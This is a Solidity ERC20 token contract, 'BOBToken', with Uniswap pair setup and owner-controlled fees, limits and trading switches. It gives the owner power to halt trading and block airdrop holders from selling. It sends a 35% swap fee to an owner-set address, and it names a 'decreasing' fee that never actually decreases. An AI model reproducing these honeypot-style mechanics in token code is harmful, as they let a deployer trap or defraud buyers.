// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IAirdropContract {
    function getAmountOfAddress(
        address _address
    ) external view returns (uint256);
}

contract BOBToken is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public marketingAddress;
    bool private inSwap;

    uint256 private fixedFee = 5;
    uint256 private decrementFee = 35;
    uint256 public maxSetFee = 35;
    uint256 private lastFeeDecreaseTime;
    bool public isCreatedLP = false;
    uint256 private feeDecreaseInterval = 2 minutes;

    uint256 public _maxTxAmount;
    uint256 public _maxWalletAmount;
    bool public normalTransfer = false;
    bool public airdropAddressCanSwap = false;
    IAirdropContract public airdropContract;

    mapping(address => bool) public excludeFee;

    bool public tradingOpen = false;

    event RawTransfer(uint256 indexed amount, address indexed sender);

    constructor() ERC20("BobArb", "BOB") {
        uint256 _totalSupply = 100_000_000_000 * 10 ** 18; // 100 billion tokens with 18 decimals
        _maxTxAmount = 2 * (_totalSupply / 100);
        _maxWalletAmount = 100 * (_totalSupply / 100);
        _mint(msg.sender, _totalSupply);
        marketingAddress = _msgSender();
        lastFeeDecreaseTime = block.timestamp;
    }

    function init(address _airdropAddress) public onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            // 0x8A791620dd6260079BF849Dc5567aDC3F2FdC318
            // 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        airdropContract = IAirdropContract(_airdropAddress);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        emit RawTransfer(amount, sender);
        if (!isCreatedLP) {
            if (recipient == uniswapV2Pair) {
                require(
                    _msgSender() == owner(),
                    "Only owner can add liquidity"
                );
                isCreatedLP = true;
            }
        }
        if (normalTransfer) {
            super._transfer(sender, recipient, amount);
            return;
        }
        if (recipient != owner() && recipient != uniswapV2Pair) {
            require(
                balanceOf(recipient).add(amount) <= _maxWalletAmount,
                "Recipient wallet limit exceeded"
            );
        }

        if (sender != owner() && recipient != uniswapV2Pair) {
            require(
                amount <= _maxTxAmount,
                "Transaction amount limit exceeded"
            );
        }

        if (sender == uniswapV2Pair || recipient == uniswapV2Pair) {
            if (sender != owner() && recipient != owner()) {
                require(tradingOpen, "Trading is not enabled");
            }
        }

        bool isAddLp = sender == owner() && recipient == uniswapV2Pair;

        if (
            tradingOpen &&
            !excludeFee[sender] &&
            (sender == uniswapV2Pair || recipient == uniswapV2Pair) &&
            !isAddLp &&
            !inSwap // prevent loop
        ) {
            if (recipient == uniswapV2Pair) {
                if (airdropContract.getAmountOfAddress(_msgSender()) > 0) {
                    require(
                        airdropAddressCanSwap,
                        "Airdrop address cannot swap"
                    );
                }
            }
            inSwap = true;
            uint256 currentFee = getCurrentFee();
            uint256 feeAmount = amount.mul(currentFee).div(100);
            uint256 remainingAmount = amount.sub(feeAmount);

            if (feeAmount > 0) {
                super._transfer(sender, marketingAddress, feeAmount);
            }
            super._transfer(sender, recipient, remainingAmount);
            inSwap = false;
        } else {
            super._transfer(sender, recipient, amount);
        }
    }

    function getCurrentFee() public view returns (uint256) {
        return decrementFee;
    }

    function setNormalTransfer(bool _normalTransfer) external onlyOwner {
        normalTransfer = _normalTransfer;
    }

    function setDecrementFee(uint256 _decrementFee) external onlyOwner {
        require(
            _decrementFee <= maxSetFee,
            "Fee cannot be larger than maxSetFee"
        );
        decrementFee = _decrementFee;
    }

    function setFixedFee(uint256 _fixedFee) external onlyOwner {
        fixedFee = _fixedFee;
    }

    function setAirdropAddressCanSwap(
        bool _airdropAddressCanSwap
    ) external onlyOwner {
        airdropAddressCanSwap = _airdropAddressCanSwap;
    }

    function setMarketingAddress(address _marketingAddress) external onlyOwner {
        marketingAddress = _marketingAddress;
    }

    function setMaxTxAmount(uint256 _newMaxTxAmount) external onlyOwner {
        _maxTxAmount = _newMaxTxAmount;
    }

    function setMaxWalletAmount(
        uint256 _newMaxWalletAmount
    ) external onlyOwner {
        _maxWalletAmount = _newMaxWalletAmount;
    }

    function setExcludeFee(address _address, bool _exclude) external onlyOwner {
        excludeFee[_address] = _exclude;
    }

    function setTradingOpen(bool _tradingOpen) external onlyOwner {
        tradingOpen = _tradingOpen;
    }

    function setTradingOpenAndLastFeeDecreaseTime() public onlyOwner {
        tradingOpen = true;
        lastFeeDecreaseTime = block.timestamp;
    }

    function updateFeeDecreaseInterval(
        uint256 _newInterval
    ) external onlyOwner {
        feeDecreaseInterval = _newInterval;
    }

    receive() external payable {}
}